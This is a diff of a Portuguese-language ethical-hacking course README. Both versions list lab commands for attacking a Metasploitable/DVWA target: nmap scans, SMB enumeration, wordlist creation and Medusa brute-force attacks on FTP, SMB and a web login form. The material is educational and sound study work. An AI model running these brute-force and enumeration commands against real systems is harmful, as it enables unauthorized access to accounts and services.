@@ -1,260 +1,103 @@
-# Hacking Ético: Vulnerabilidades e Teste de Invasão
+Hacking Ético: Vulnerabilidades e Teste de Invasão
 
-Este projeto demonstra, de forma **educacional**, como funciona um processo básico de **teste de invasão (Pentest)** utilizando ferramentas populares de **cibersegurança**.
+No módulo foi mostrado como funciona de forma prática um ato de invasão, usando as seguintes ferramentas; 
 
-O objetivo é compreender **vulnerabilidades de sistemas**, técnicas de **reconhecimento de rede**, **enumeração de serviços** e **testes de força bruta** em ambientes controlados.
+Oracle Virtual Box (Softare) 
+Kali Linux (Sistema Operacional) 
+Metasploitable (Sistema Operacional)
 
----
+Ambos os sistemas instalados e configurados na VM, rodando os 2 simultaneamente. 
 
-# Ambiente Utilizado
 
-As atividades foram realizadas em um ambiente virtual utilizando:
+Ao decorrer das etapas foram repassados os nomes de ferramentas e para que são Utilizadas, as principais ferramentas utilizadas neste módulo foram o NMAP, e a Ferramenta Medusa, mas foram citadas 
+algumas outras com funções semelhantes, com o mesmo objetivo sendo elas; Hydra, Ncrack, John e Patator.   
 
-- **Oracle VirtualBox** – Software de virtualização
-- **Kali Linux** – Sistema operacional focado em segurança ofensiva
-- **Metasploitable** – Sistema propositalmente vulnerável para estudo
+NMAP (para exploração de rede, auditoria de segurança e testes de intrusão)
 
-Ambos os sistemas foram executados simultaneamente dentro da máquina virtual para simular um ambiente de ataque e alvo.
+MEDUSA (ferramenta de código aberto voltada para a segurança da informação, comumente utilizada em auditorias de senhas e testes de penetração (pentest). Ela é bastante popular e vem pré-instalada na distribuição Kali)
 
----
+Hydra (ataque de força bruta em logins)
+Ferramenta usada para testar várias combinações de usuário e senha em serviços como SSH, FTP e sites, para descobrir logins válidos.
 
-# Ferramentas Utilizadas
+Ncrack (testar senhas em serviços de rede)
+Ferramenta usada para tentar várias senhas em serviços de rede como SSH, FTP e RDP, verificando se alguma funciona.
 
-Durante o módulo foram apresentadas diversas ferramentas utilizadas em **pentests**.
+John the Ripper (descobrir senhas a partir de hashes)
+Ferramenta usada para quebrar hashes de senha e descobrir qual é a senha original.
 
-## Nmap
-Ferramenta utilizada para **exploração de rede, auditoria de segurança e testes de intrusão**.  
-Permite identificar:
+Patator (ataques de força bruta avançados)
+Ferramenta usada para testar senhas em vários tipos de serviços, permitindo ataques mais personalizados.
 
-- portas abertas
-- serviços ativos
-- versões de software
-- sistema operacional do alvo
 
-## Medusa
-Ferramenta de **código aberto** utilizada para **auditoria de senhas e ataques de força bruta** em diferentes serviços de rede.
 
-É bastante utilizada em **testes de penetração (pentest)** e já vem instalada no **Kali Linux**.
 
----
 
-# Outras Ferramentas Citadas
+O sistema Metaspoitable é um sistema para estudo, ele é propositalmente vulnerável para que o usuário estude suas táticas de invasão e segurança de sistema. 
+o Nmap junto com a ferramenta Medusa é capaz de penetrar o sistema alvo com algumas linhas de códigos, caso o sistema alvo esteja vulnerável poderá chegar à altas chances de sucesso. 
 
-### Hydra
-Ferramenta usada para testar várias combinações de **usuário e senha** em serviços como SSH, FTP e páginas web.
+Lista Consolidada de Comandos e Funções
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6: Realiza um ataque de força bruta em um formulário de login web específico, definindo os campos de usuário/senha e a mensagem de erro para validar a falha.
 
-### Ncrack
-Ferramenta especializada em **testar autenticação em serviços de rede**, como SSH, FTP e RDP.
+enum4linux -a 192.168.56.101 | tee enum4_output.txt: Ferramenta de enumeração para sistemas Windows e Samba; o -a extrai todas as informações possíveis (usuários, compartilhamentos, políticas) e o tee salva o resultado em um arquivo enquanto mostra na tela.
 
-### John the Ripper
-Ferramenta utilizada para **quebrar hashes de senha** e descobrir a senha original.
+echo -e "user\nnmsfadmin\nservice" > smb_users.txt: Cria rapidamente uma lista de usuários específicos para serem testados contra o serviço Samba (SMB).
 
-### Patator
-Ferramenta modular usada para **ataques de força bruta avançados**, permitindo testes personalizados em diversos serviços.
+echo -e "password\n123456\nWelcome123\nnmsfadmin" > senhas_spray.txt: Cria uma lista de senhas (wordlist) para realizar um ataque de "Password Spraying".
 
----
+medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50: Executa o ataque de força bruta especificamente contra o protocolo SMB (Windows Networking) usando o módulo smbnt.
 
-# Sistema Metasploitable
+smbclient -L //192.168.56.101 -U msfadmin: Tenta listar (-L) as pastas compartilhadas no servidor alvo usando o usuário msfadmin.
 
-O **Metasploitable** é um sistema propositalmente vulnerável criado para **estudo de segurança da informação**.
+1. Reconhecimento e Exploração (Nmap)
+Fase inicial para descobrir o que está rodando no alvo.
 
-Ele permite que estudantes e profissionais pratiquem:
+nmap -v -T5 -sS -Pn --open 192.168.56.102/22
+Scan rápido e agressivo para encontrar portas abertas.
 
-- reconhecimento de rede
-- exploração de serviços
-- descoberta de vulnerabilidades
-- testes de invasão em ambiente controlado
+nmap -n 192.168.56.102/22
+Scan rápido sem resolução de DNS.
 
----
+nmap -A 192.168.56.101
+Detecção agressiva (sistema operacional, versões de serviços e scripts) no alvo final.
 
-# Lista Consolidada de Comandos
+nmap -sV -p 21,22,80,445,139 192.168.56.101
+Verifica versões específicas dos serviços FTP, SSH, HTTP e SMB.
 
-## Ataque de Força Bruta em Login Web
-
-```bash
-medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
-```
-
-Realiza um ataque de força bruta em um formulário de login web específico, definindo os campos de usuário e senha.
-
----
-
-## Enumeração de Sistema SMB
-
-```bash
-enum4linux -a 10.10.10.50 | tee enum4_output.txt
-```
-
-Ferramenta usada para coletar informações de sistemas **Windows e Samba**, incluindo:
-
-- usuários
-- compartilhamentos
-- políticas de rede
-
-O comando `tee` salva o resultado em um arquivo enquanto mostra no terminal.
-
----
-
-## Criação de Lista de Usuários
-
-```bash
-echo -e "user\nnmsfadmin\nservice" > smb_users.txt
-```
-
-Cria uma lista de usuários para testes de autenticação no serviço SMB.
-
----
-
-## Criação de Lista de Senhas
-
-```bash
-echo -e "password\n123456\nWelcome123\nnmsfadmin" > senhas_spray.txt
-```
-
-Cria uma **wordlist de senhas** para testes de login.
-
----
-
-## Ataque de Força Bruta em SMB
-
-```bash
-medusa -h 10.10.10.50 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
-```
-
-Executa tentativas de login contra o protocolo **SMB (Windows Networking)**.
-
----
-
-## Listar Compartilhamentos SMB
-
-```bash
-smbclient -L //10.10.10.50 -U msfadmin
-```
-
-Lista os diretórios compartilhados no servidor SMB.
-
----
-
-# Reconhecimento de Rede com Nmap
-
-## Scan rápido e agressivo
-
-```bash
-nmap -v -T5 -sS -Pn --open 10.10.10.0/24
-```
-
-Procura portas abertas rapidamente.
-
----
-
-## Scan sem resolução DNS
-
-```bash
-nmap -n 10.10.10.0/24
-```
-
-Realiza o scan sem tentar resolver nomes de domínio.
-
----
-
-## Detecção avançada de sistema
-
-```bash
-nmap -A 10.10.10.50
-```
-
-Detecta:
-
-- sistema operacional
-- versões de serviços
-- scripts de exploração
-
----
-
-## Scan de portas específicas
-
-```bash
-nmap -sV -p 21,22,80,445,139 10.10.10.50
-```
-
-Verifica versões dos serviços:
-
-- FTP
-- SSH
-- HTTP
-- SMB
-
----
-
-## Ajuda de scripts de exploração
-
-```bash
 nmap --script-help exploit
-```
+Lista ajuda para scripts de exploração do Nmap.
 
-Lista scripts de exploração disponíveis no Nmap.
 
----
+2. Preparação de Dicionários (Wordlists)
+Criação de arquivos de texto para ataques de força bruta.
 
-# Preparação de Wordlists
-
-## Lista de usuários
-
-```bash
 echo -e "user\nnmsfadmin\nnadmin\nroot" > users.txt
-```
+Cria uma lista de possíveis nomes de usuário.
+O \n quebra a linha e cria uma lista vertical.
 
-Cria uma lista de possíveis usuários.
-
----
-
-## Lista de senhas
-
-```bash
 echo -e "123456\npassword\nqwerty\nnmsfadmin" > pass.txt
-```
+Cria uma lista de senhas comuns para testar.
 
-Cria uma lista de senhas comuns.
 
----
+3. Ataque de Força Bruta (Medusa)
+Ferramenta que testa automaticamente várias combinações de usuário e senha.
 
-# Ataque de Força Bruta com Medusa
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp
+Alvo: Servidor FTP
+Tenta todas as combinações de usuários e senhas contra o serviço FTP.
 
-## Ataque em servidor FTP
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php'
+Alvo: Página Web (DVWA)
+Tenta quebrar o login de uma página web específica.
 
-```bash
-medusa -h 10.10.10.50 -U users.txt -P pass.txt -M ftp
-```
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m FORM:'username=^USER^&password=^PASS^'
+Alvo: Formulário Web
+Define como os dados de login são enviados.
+^USER^ e ^PASS^ são variáveis substituídas pelos usuários e senhas das listas.
 
-Testa várias combinações de login no serviço FTP.
 
----
 
-## Ataque em página web
 
-```bash
-medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php'
-```
 
-Tenta quebrar o login de uma página web.
 
----
 
-## Ataque em formulário web
-
-```bash
-medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m FORM:'username=^USER^&password=^PASS^'
-```
-
-Define como os dados de login são enviados no formulário.
-
-`^USER^` e `^PASS^` são variáveis substituídas automaticamente pelas listas.
-
----
-
-# Aviso
-
-Este projeto possui **fins educacionais** e demonstra técnicas utilizadas em **testes de segurança autorizados**.
-
-Nunca utilize essas ferramentas contra sistemas **sem autorização**.
 
